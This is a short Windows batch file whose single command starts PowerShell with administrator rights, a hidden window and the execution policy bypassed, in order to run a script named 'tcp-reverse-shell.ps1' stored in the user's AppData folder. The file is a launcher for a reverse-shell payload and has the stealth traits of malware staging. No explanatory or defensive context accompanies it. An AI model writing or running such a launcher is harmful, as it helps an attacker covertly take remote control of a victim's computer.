@echo off
powershell -Command "Start-Process powershell \"-ExecutionPolicy Bypass -NoProfile -NoExit -command "%APPDATA%\tcp-reverse-shell.ps1"\" -Verb RunAs -WindowStyle hidden
